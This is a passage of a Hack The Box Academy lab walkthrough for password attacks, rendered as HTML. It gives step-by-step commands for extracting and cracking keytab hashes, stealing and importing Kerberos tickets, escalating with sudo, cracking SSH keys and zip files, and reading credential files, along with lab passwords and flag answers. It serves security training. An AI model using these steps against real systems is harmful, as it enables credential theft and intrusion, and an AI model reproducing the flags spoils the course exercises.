<span class="normal"><a href="#__codelineno-189-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-189-1"><a id="__codelineno-189-1" name="__codelineno-189-1"></a><span class="c"># We can attempt to crack the account&#39;s password by extracting the hashes from the keytab file with [KeyTabExtract](keytabextract.md).</span>
</span><span id="__span-189-2"><a id="__codelineno-189-2" name="__codelineno-189-2"></a><span class="n">python3</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">keytabextract</span><span class="p">.</span><span class="n">py</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">specialfiles</span><span class="p">/</span><span class="n">carlos</span><span class="p">.</span><span class="n">keytab</span>
</span><span id="__span-189-3"><a id="__codelineno-189-3" name="__codelineno-189-3"></a>
</span><span id="__span-189-4"><a id="__codelineno-189-4" name="__codelineno-189-4"></a><span class="c"># Now we can try to crack the NTLM hash offline:</span>
</span><span id="__span-189-5"><a id="__codelineno-189-5" name="__codelineno-189-5"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">1000</span> <span class="n">a738f92b3c08b424ec2d99589a9cce60</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-189-6"><a id="__codelineno-189-6" name="__codelineno-189-6"></a><span class="c"># It returns Password5</span>
</span><span id="__span-189-7"><a id="__codelineno-189-7" name="__codelineno-189-7"></a>
</span><span id="__span-189-8"><a id="__codelineno-189-8" name="__codelineno-189-8"></a><span class="c"># Login as carlos@inlanefreight.htb</span>
</span><span id="__span-189-9"><a id="__codelineno-189-9" name="__codelineno-189-9"></a><span class="n">su</span> <span class="n">carlos</span><span class="nv">@inlanefreight</span><span class="p">.</span><span class="n">htb</span>
</span><span id="__span-189-10"><a id="__codelineno-189-10" name="__codelineno-189-10"></a>
</span><span id="__span-189-11"><a id="__codelineno-189-11" name="__codelineno-189-11"></a><span class="c"># Prints the flag</span>
</span><span id="__span-189-12"><a id="__codelineno-189-12" name="__codelineno-189-12"></a><span class="nb">cat </span><span class="p">~/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: C@rl0s_1$_H3r3</p>
<p><strong>Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-190-1">1</a></span>
<span class="normal"><a href="#__codelineno-190-2">2</a></span>
<span class="normal"><a href="#__codelineno-190-3">3</a></span>
<span class="normal"><a href="#__codelineno-190-4">4</a></span>
<span class="normal"><a href="#__codelineno-190-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-190-1"><a id="__codelineno-190-1" name="__codelineno-190-1"></a><span class="c"># We check out the cronjobs for Carlos (logged as Carlos)</span>
</span><span id="__span-190-2"><a id="__codelineno-190-2" name="__codelineno-190-2"></a><span class="n">crontab</span> <span class="n">-l</span>
</span><span id="__span-190-3"><a id="__codelineno-190-3" name="__codelineno-190-3"></a>
</span><span id="__span-190-4"><a id="__codelineno-190-4" name="__codelineno-190-4"></a><span class="c"># In the output we obtain the path for this script /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh. Let&#39;s read the script:</span>
</span><span id="__span-190-5"><a id="__codelineno-190-5" name="__codelineno-190-5"></a><span class="nb">cat </span><span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">carlos</span><span class="nv">@inlanefreight</span><span class="p">.</span><span class="n">htb</span><span class="p">/.</span><span class="n">scripts</span><span class="p">/</span><span class="n">kerberos_script_test</span><span class="p">.</span><span class="n">sh</span>
</span></code></pre></div></td></tr></table></div>
<p>Output:
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-191-1">1</a></span>
<span class="normal"><a href="#__codelineno-191-2">2</a></span>
<span class="normal"><a href="#__codelineno-191-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-191-1"><a id="__codelineno-191-1" name="__codelineno-191-1"></a>#!/bin/bash
</span><span id="__span-191-2"><a id="__codelineno-191-2" name="__codelineno-191-2"></a>kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
</span><span id="__span-191-3"><a id="__codelineno-191-3" name="__codelineno-191-3"></a>smbclient //dc01.inlanefreight.htb/svc_workstations -c &#39;ls&#39;  -k -no-pass &gt; /home/carlos@inlanefreight.htb/script-test-results.txt
</span></code></pre></div></td></tr></table></div></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-192-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-192-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-192-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-192-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-192-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-192-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-192-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-192-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-192-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-192-10">10</a></span>
<span class="normal"><a href="#__codelineno-192-11">11</a></span>
<span class="normal"><a href="#__codelineno-192-12">12</a></span>
<span class="normal"><a href="#__codelineno-192-13">13</a></span>
<span class="normal"><a href="#__codelineno-192-14">14</a></span>
<span class="normal"><a href="#__codelineno-192-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-192-1"><a id="__codelineno-192-1" name="__codelineno-192-1"></a># We can use the keytab file of the svc_workstation@INLANEFREIGHT.HTB user to impersonate ourselves. See which ticket we are currently using
</span><span id="__span-192-2"><a id="__codelineno-192-2" name="__codelineno-192-2"></a>klist
</span><span id="__span-192-3"><a id="__codelineno-192-3" name="__codelineno-192-3"></a>
</span><span id="__span-192-4"><a id="__codelineno-192-4" name="__codelineno-192-4"></a># Use kinit with the svc_workstation@INLANEFREIGHT.HTB&#39;s keytab
</span><span id="__span-192-5"><a id="__codelineno-192-5" name="__codelineno-192-5"></a>kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
</span><span id="__span-192-6"><a id="__codelineno-192-6" name="__codelineno-192-6"></a>
</span><span id="__span-192-7"><a id="__codelineno-192-7" name="__codelineno-192-7"></a># If we check out the keytab file in use we will see svc_workstation@INLANEFREIGHT.HTB&#39;s
</span><span id="__span-192-8"><a id="__codelineno-192-8" name="__codelineno-192-8"></a>klist
</span><span id="__span-192-9"><a id="__codelineno-192-9" name="__codelineno-192-9"></a>
</span><span id="__span-192-10"><a id="__codelineno-192-10" name="__codelineno-192-10"></a># But as ssh connection does not allow the -k flag we will try to obtain the creds better:
</span><span id="__span-192-11"><a id="__codelineno-192-11" name="__codelineno-192-11"></a>python3 /opt/keytabextract.py  /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
</span><span id="__span-192-12"><a id="__codelineno-192-12" name="__codelineno-192-12"></a>
</span><span id="__span-192-13"><a id="__codelineno-192-13" name="__codelineno-192-13"></a># Access to the linux01 as svc_workstations@inlanefreight.htb
</span><span id="__span-192-14"><a id="__codelineno-192-14" name="__codelineno-192-14"></a>ssh svc_workstations@inlanefreight.htb@172.16.1.15
</span><span id="__span-192-15"><a id="__codelineno-192-15" name="__codelineno-192-15"></a># Enter password: Password4
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>Mor3_4cce$$_m0r3_Pr1v$</code></p>
<p><strong>Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-193-1">1</a></span>
<span class="normal"><a href="#__codelineno-193-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-193-1"><a id="__codelineno-193-1" name="__codelineno-193-1"></a><span class="n">sudo</span> <span class="n">-l</span>
</span><span id="__span-193-2"><a id="__codelineno-193-2" name="__codelineno-193-2"></a><span class="n">sudo</span> <span class="nb">cat </span><span class="p">/</span><span class="n">root</span><span class="p">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>Ro0t_Pwn_K3yT4b</code></p>
<p><strong>Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \DC01\julio.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-194-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-194-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-194-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-194-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-194-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-194-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-194-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-194-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-194-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-194-10">10</a></span>
<span class="normal"><a href="#__codelineno-194-11">11</a></span>
<span class="normal"><a href="#__codelineno-194-12">12</a></span>
<span class="normal"><a href="#__codelineno-194-13">13</a></span>
<span class="normal"><a href="#__codelineno-194-14">14</a></span>
<span class="normal"><a href="#__codelineno-194-15">15</a></span>
<span class="normal"><a href="#__codelineno-194-16">16</a></span>
<span class="normal"><a href="#__codelineno-194-17">17</a></span>
<span class="normal"><a href="#__codelineno-194-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-194-1"><a id="__codelineno-194-1" name="__codelineno-194-1"></a><span class="c"># List ccache files</span>
</span><span id="__span-194-2"><a id="__codelineno-194-2" name="__codelineno-194-2"></a><span class="nb">ls </span><span class="n">-la</span> <span class="p">/</span><span class="n">tmp</span>
</span><span id="__span-194-3"><a id="__codelineno-194-3" name="__codelineno-194-3"></a>
</span><span id="__span-194-4"><a id="__codelineno-194-4" name="__codelineno-194-4"></a><span class="c"># We copy the one we are interested in, belonging to the user julio</span>
</span><span id="__span-194-5"><a id="__codelineno-194-5" name="__codelineno-194-5"></a><span class="nb">cp </span><span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">krb5cc_647401106_hdWu4q</span> <span class="p">/</span><span class="n">root</span>
</span><span id="__span-194-6"><a id="__codelineno-194-6" name="__codelineno-194-6"></a>
</span><span id="__span-194-7"><a id="__codelineno-194-7" name="__codelineno-194-7"></a><span class="c">#  Importing the ccache File into our Current Session</span>
</span><span id="__span-194-8"><a id="__codelineno-194-8" name="__codelineno-194-8"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=/</span><span class="n">root</span><span class="p">/</span><span class="n">krb5cc_647401106_HRJDux</span>
</span><span id="__span-194-9"><a id="__codelineno-194-9" name="__codelineno-194-9"></a>
</span><span id="__span-194-10"><a id="__codelineno-194-10" name="__codelineno-194-10"></a><span class="c"># Now we can list the tickets and check we could impersonate the user we selected</span>
</span><span id="__span-194-11"><a id="__codelineno-194-11" name="__codelineno-194-11"></a><span class="n">klist</span>
</span><span id="__span-194-12"><a id="__codelineno-194-12" name="__codelineno-194-12"></a>
</span><span id="__span-194-13"><a id="__codelineno-194-13" name="__codelineno-194-13"></a><span class="c"># For instance we can do this:</span>
</span><span id="__span-194-14"><a id="__codelineno-194-14" name="__codelineno-194-14"></a><span class="n">smbclient</span> <span class="p">//</span><span class="n">DC01</span><span class="p">/</span><span class="n">julio</span> <span class="n">-k</span> <span class="n">-c</span> <span class="nb">ls</span>
</span><span id="__span-194-15"><a id="__codelineno-194-15" name="__codelineno-194-15"></a><span class="n">smbclient</span> <span class="p">//</span><span class="n">DC01</span><span class="p">/</span><span class="n">julio</span> <span class="n">-k</span> <span class="n">-c</span> <span class="s1">&#39;get julio.txt&#39;</span>
</span><span id="__span-194-16"><a id="__codelineno-194-16" name="__codelineno-194-16"></a>
</span><span id="__span-194-17"><a id="__codelineno-194-17" name="__codelineno-194-17"></a><span class="c"># And cat the file</span>
</span><span id="__span-194-18"><a id="__codelineno-194-18" name="__codelineno-194-18"></a><span class="nb">cat </span><span class="n">julio</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>JuL1()_SH@re_fl@g</code></p>
<p><strong>Use the LINUX01$ Kerberos ticket to read the flag found in \DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-195-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-195-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-195-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-195-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-195-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-195-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-195-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-195-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-195-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-195-10">10</a></span>
<span class="normal"><a href="#__codelineno-195-11">11</a></span>
<span class="normal"><a href="#__codelineno-195-12">12</a></span>
<span class="normal"><a href="#__codelineno-195-13">13</a></span>
<span class="normal"><a href="#__codelineno-195-14">14</a></span>
<span class="normal"><a href="#__codelineno-195-15">15</a></span>
<span class="normal"><a href="#__codelineno-195-16">16</a></span>
<span class="normal"><a href="#__codelineno-195-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-195-1"><a id="__codelineno-195-1" name="__codelineno-195-1"></a><span class="c"># Run linikatz</span>
</span><span id="__span-195-2"><a id="__codelineno-195-2" name="__codelineno-195-2"></a><span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">linikatz</span><span class="p">.</span><span class="n">sh</span>
</span><span id="__span-195-3"><a id="__codelineno-195-3" name="__codelineno-195-3"></a>
</span><span id="__span-195-4"><a id="__codelineno-195-4" name="__codelineno-195-4"></a><span class="c"># It will enumerate some interesting files such as </span>
</span><span id="__span-195-5"><a id="__codelineno-195-5" name="__codelineno-195-5"></a><span class="n">-rw</span><span class="p">-------</span> <span class="n">1</span> <span class="n">root</span> <span class="n">root</span> <span class="n">4154</span> <span class="n">Jan</span> <span class="n">19</span> <span class="n">15</span><span class="p">:</span><span class="n">10</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">sss</span><span class="p">/</span><span class="n">db</span><span class="p">/</span><span class="n">ccache_INLANEFREIGHT</span><span class="p">.</span><span class="n">HTB</span>
</span><span id="__span-195-6"><a id="__codelineno-195-6" name="__codelineno-195-6"></a>
</span><span id="__span-195-7"><a id="__codelineno-195-7" name="__codelineno-195-7"></a><span class="c"># # Copying the file in our home</span>
</span><span id="__span-195-8"><a id="__codelineno-195-8" name="__codelineno-195-8"></a><span class="nb">cp </span><span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">sss</span><span class="p">/</span><span class="n">db</span><span class="p">/</span><span class="n">ccache_INLANEFREIGHT</span><span class="p">.</span><span class="n">HTB</span> <span class="p">/</span><span class="n">root</span>
</span><span id="__span-195-9"><a id="__codelineno-195-9" name="__codelineno-195-9"></a>
</span><span id="__span-195-10"><a id="__codelineno-195-10" name="__codelineno-195-10"></a><span class="c"># Importing the ccache File into our Current Session</span>
</span><span id="__span-195-11"><a id="__codelineno-195-11" name="__codelineno-195-11"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=/</span><span class="n">root</span><span class="p">/</span><span class="n">ccache_INLANEFREIGHT</span><span class="p">.</span><span class="n">HTB</span>
</span><span id="__span-195-12"><a id="__codelineno-195-12" name="__codelineno-195-12"></a>
</span><span id="__span-195-13"><a id="__codelineno-195-13" name="__codelineno-195-13"></a><span class="c"># Check the running ticket now and we will see Linux01</span>
</span><span id="__span-195-14"><a id="__codelineno-195-14" name="__codelineno-195-14"></a><span class="n">klist</span>
</span><span id="__span-195-15"><a id="__codelineno-195-15" name="__codelineno-195-15"></a><span class="n">smbclient</span> <span class="p">//</span><span class="n">DC01</span><span class="p">/</span><span class="n">linux01</span> <span class="n">-k</span> <span class="n">-c</span> <span class="nb">ls</span>
</span><span id="__span-195-16"><a id="__codelineno-195-16" name="__codelineno-195-16"></a><span class="n">smbclient</span> <span class="p">//</span><span class="n">DC01</span><span class="p">/</span><span class="n">linux01</span> <span class="n">-k</span> <span class="n">-c</span> <span class="s1">&#39;get flag.txt&#39;</span>
</span><span id="__span-195-17"><a id="__codelineno-195-17" name="__codelineno-195-17"></a><span class="nb">cat </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: Us1nG_KeyTab_Like_@_PRO</p>
<p><strong>Optional Exercises. Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished.</strong></p>
<p>Results: DONE</p>
<p><strong>Optional Exercises. From Windows (MS01), export Julio's ticket using Mimikatz or Rubeus. Convert the ticket to ccache and use it from Linux to connect to the C disk. Mark DONE when finished.</strong></p>
<p>Results: DONE</p>
<h3 id="cracking-files">Cracking Files</h3>
<p><strong>Use the cracked password of the user Kira and log in to the host and crack the "id_rsa" SSH key. Then, submit the password for the SSH key as the answer.</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-196-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-196-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-196-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-196-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-196-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-196-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-196-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-196-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-196-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-196-10">10</a></span>
<span class="normal"><a href="#__codelineno-196-11">11</a></span>
<span class="normal"><a href="#__codelineno-196-12">12</a></span>
<span class="normal"><a href="#__codelineno-196-13">13</a></span>
<span class="normal"><a href="#__codelineno-196-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-196-1"><a id="__codelineno-196-1" name="__codelineno-196-1"></a>ssh<span class="w"> </span>kira@<span class="nv">$ip</span>
</span><span id="__span-196-2"><a id="__codelineno-196-2" name="__codelineno-196-2"></a><span class="c1"># Enter the password: L0vey0u1!</span>
</span><span id="__span-196-3"><a id="__codelineno-196-3" name="__codelineno-196-3"></a>
</span><span id="__span-196-4"><a id="__codelineno-196-4" name="__codelineno-196-4"></a><span class="c1"># Dump id_rsa key and copy</span>
</span><span id="__span-196-5"><a id="__codelineno-196-5" name="__codelineno-196-5"></a>cat<span class="w"> </span>.ssh/id_rsa
</span><span id="__span-196-6"><a id="__codelineno-196-6" name="__codelineno-196-6"></a>
</span><span id="__span-196-7"><a id="__codelineno-196-7" name="__codelineno-196-7"></a><span class="c1"># Create a file id_rsa in your attacking machine and save the key. Now create the hash with ssh2john</span>
</span><span id="__span-196-8"><a id="__codelineno-196-8" name="__codelineno-196-8"></a>ssh2john<span class="w"> </span>id_rsa<span class="w"> </span>&gt;<span class="w"> </span>ssh.hash
</span><span id="__span-196-9"><a id="__codelineno-196-9" name="__codelineno-196-9"></a>
</span><span id="__span-196-10"><a id="__codelineno-196-10" name="__codelineno-196-10"></a><span class="c1"># Now we create a mutated list with the custom.rule file provided as resource by HTB</span>
</span><span id="__span-196-11"><a id="__codelineno-196-11" name="__codelineno-196-11"></a>hashcat<span class="w"> </span>--force<span class="w"> </span>password.list<span class="w"> </span>-r<span class="w"> </span>custom.rule<span class="w"> </span>--stdout<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span>&gt;<span class="w"> </span>mutatedlist.list
</span><span id="__span-196-12"><a id="__codelineno-196-12" name="__codelineno-196-12"></a>
</span><span id="__span-196-13"><a id="__codelineno-196-13" name="__codelineno-196-13"></a><span class="c1"># Finally we crack it with john</span>
</span><span id="__span-196-14"><a id="__codelineno-196-14" name="__codelineno-196-14"></a>john<span class="w"> </span>--wordlis<span class="o">=</span>mutatedlist.list<span class="w"> </span>ssh.hash<span class="w"> </span>
</span></code></pre></div></td></tr></table></div>
<p>Results: L0veme</p>
<p><strong>Use the cracked password of the user Kira, log in to the host, and read the Notes.zip file containing the flag. Then, submit the flag as the answer.</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-197-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-197-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-197-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-197-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-197-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-197-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-197-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-197-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-197-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-197-10">10</a></span>
<span class="normal"><a href="#__codelineno-197-11">11</a></span>
<span class="normal"><a href="#__codelineno-197-12">12</a></span>
<span class="normal"><a href="#__codelineno-197-13">13</a></span>
<span class="normal"><a href="#__codelineno-197-14">14</a></span>
<span class="normal"><a href="#__codelineno-197-15">15</a></span>
<span class="normal"><a href="#__codelineno-197-16">16</a></span>
<span class="normal"><a href="#__codelineno-197-17">17</a></span>
<span class="normal"><a href="#__codelineno-197-18">18</a></span>
<span class="normal"><a href="#__codelineno-197-19">19</a></span>
<span class="normal"><a href="#__codelineno-197-20">20</a></span>
<span class="normal"><a href="#__codelineno-197-21">21</a></span>
<span class="normal"><a href="#__codelineno-197-22">22</a></span>
<span class="normal"><a href="#__codelineno-197-23">23</a></span>
<span class="normal"><a href="#__codelineno-197-24">24</a></span>
<span class="normal"><a href="#__codelineno-197-25">25</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-197-1"><a id="__codelineno-197-1" name="__codelineno-197-1"></a>ssh<span class="w"> </span>kira@<span class="nv">$ip</span>
</span><span id="__span-197-2"><a id="__codelineno-197-2" name="__codelineno-197-2"></a><span class="c1"># Enter the password: L0vey0u1!</span>
</span><span id="__span-197-3"><a id="__codelineno-197-3" name="__codelineno-197-3"></a>
</span><span id="__span-197-4"><a id="__codelineno-197-4" name="__codelineno-197-4"></a><span class="c1"># Convert into a base64 string the Notes.zip in kira&#39;s terminal and copy the output string</span>
</span><span id="__span-197-5"><a id="__codelineno-197-5" name="__codelineno-197-5"></a>base64<span class="w"> </span>~/Documents/Notes.zip<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span>
</span><span id="__span-197-6"><a id="__codelineno-197-6" name="__codelineno-197-6"></a>
</span><span id="__span-197-7"><a id="__codelineno-197-7" name="__codelineno-197-7"></a><span class="c1"># In your kali attacking machine, save the string back into a zip file</span>
</span><span id="__span-197-8"><a id="__codelineno-197-8" name="__codelineno-197-8"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;UEsDBAoACQAAAPh+SVQ70s7QJgAAABoAAAAJABwAbm90ZXMudHh0VVQJAAP01QNi99UDYnV4CwABBOgDAAAE6AMAALFUBGWV5fc4rSC9HNoIlYqIFL1sYVMhgYPASW1yjaNkYcDHt34cUEsHCDvSztAmAAAAGgAAAFBLAQIeAwoACQAAAPh+SVQ70s7QJgAAABoAAAAJABgAAAAAAAEAAAC0gQAAAABub3Rlcy50eHRVVAUAA/TVA2J1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBPAAAAeQAAAAAA&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>Notes.zip
</span><span id="__span-197-9"><a id="__codelineno-197-9" name="__codelineno-197-9"></a>
</span><span id="__span-197-10"><a id="__codelineno-197-10" name="__codelineno-197-10"></a><span class="c1"># Generate a hash with zip2john utility</span>
</span><span id="__span-197-11"><a id="__codelineno-197-11" name="__codelineno-197-11"></a>zip2john<span class="w"> </span>Notes.zip<span class="w"> </span>&gt;<span class="w"> </span>zip.hashes
</span><span id="__span-197-12"><a id="__codelineno-197-12" name="__codelineno-197-12"></a>
</span><span id="__span-197-13"><a id="__codelineno-197-13" name="__codelineno-197-13"></a><span class="c1"># Now we create a mutated list with the custom.rule file provided as resource by HTB</span>
</span><span id="__span-197-14"><a id="__codelineno-197-14" name="__codelineno-197-14"></a>hashcat<span class="w"> </span>--force<span class="w"> </span>password.list<span class="w"> </span>-r<span class="w"> </span>custom.rule<span class="w"> </span>--stdout<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span>&gt;<span class="w"> </span>mutatedlist.list
</span><span id="__span-197-15"><a id="__codelineno-197-15" name="__codelineno-197-15"></a>
</span><span id="__span-197-16"><a id="__codelineno-197-16" name="__codelineno-197-16"></a><span class="c1"># Finally, we crack it:</span>
</span><span id="__span-197-17"><a id="__codelineno-197-17" name="__codelineno-197-17"></a>john<span class="w"> </span>zip.hashes<span class="w"> </span>--wordlist<span class="o">=</span>mutatedlist.list<span class="w"> </span>
</span><span id="__span-197-18"><a id="__codelineno-197-18" name="__codelineno-197-18"></a><span class="c1"># Output: P@ssw0rd3!</span>
</span><span id="__span-197-19"><a id="__codelineno-197-19" name="__codelineno-197-19"></a>
</span><span id="__span-197-20"><a id="__codelineno-197-20" name="__codelineno-197-20"></a><span class="c1"># Unzip it</span>
</span><span id="__span-197-21"><a id="__codelineno-197-21" name="__codelineno-197-21"></a>unzip<span class="w"> </span>Notes.zip
</span><span id="__span-197-22"><a id="__codelineno-197-22" name="__codelineno-197-22"></a><span class="c1"># Enter pass: P@ssw0rd3!</span>
</span><span id="__span-197-23"><a id="__codelineno-197-23" name="__codelineno-197-23"></a>
</span><span id="__span-197-24"><a id="__codelineno-197-24" name="__codelineno-197-24"></a><span class="c1"># Cat the flag:</span>
</span><span id="__span-197-25"><a id="__codelineno-197-25" name="__codelineno-197-25"></a>cat<span class="w"> </span>notes.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{ocnc7r4io8ucsj8eujcm}</p>
<h3 id="skills-assessment-1-password-attack-easy">Skills Assessment 1: Password Attack Easy</h3>
<p>Our client Inlanefreight contracted us to assess individual hosts in their network, focusing on access control. The company recently implemented security controls related to authorization that they would like us to test. There are three hosts in scope for this assessment. The first host is used for administering and managing other servers within their environment.</p>
<p><strong>Examine the first target and submit the root password as the answer.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-198-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-198-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-198-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-198-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-198-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-198-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-198-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-198-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-198-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-198-10">10</a></span>
<span class="normal"><a href="#__codelineno-198-11">11</a></span>
<span class="normal"><a href="#__codelineno-198-12">12</a></span>
<span class="normal"><a href="#__codelineno-198-13">13</a></span>
<span class="normal"><a href="#__codelineno-198-14">14</a></span>
<span class="normal"><a href="#__codelineno-198-15">15</a></span>
<span class="normal"><a href="#__codelineno-198-16">16</a></span>
<span class="normal"><a href="#__codelineno-198-17">17</a></span>
<span class="normal"><a href="#__codelineno-198-18">18</a></span>
<span class="normal"><a href="#__codelineno-198-19">19</a></span>
<span class="normal"><a href="#__codelineno-198-20">20</a></span>
<span class="normal"><a href="#__codelineno-198-21">21</a></span>
<span class="normal"><a href="#__codelineno-198-22">22</a></span>
<span class="normal"><a href="#__codelineno-198-23">23</a></span>
<span class="normal"><a href="#__codelineno-198-24">24</a></span>
<span class="normal"><a href="#__codelineno-198-25">25</a></span>
<span class="normal"><a href="#__codelineno-198-26">26</a></span>
<span class="normal"><a href="#__codelineno-198-27">27</a></span>
<span class="normal"><a href="#__codelineno-198-28">28</a></span>
<span class="normal"><a href="#__codelineno-198-29">29</a></span>
<span class="normal"><a href="#__codelineno-198-30">30</a></span>
<span class="normal"><a href="#__codelineno-198-31">31</a></span>
<span class="normal"><a href="#__codelineno-198-32">32</a></span>
<span class="normal"><a href="#__codelineno-198-33">33</a></span>
<span class="normal"><a href="#__codelineno-198-34">34</a></span>
<span class="normal"><a href="#__codelineno-198-35">35</a></span>
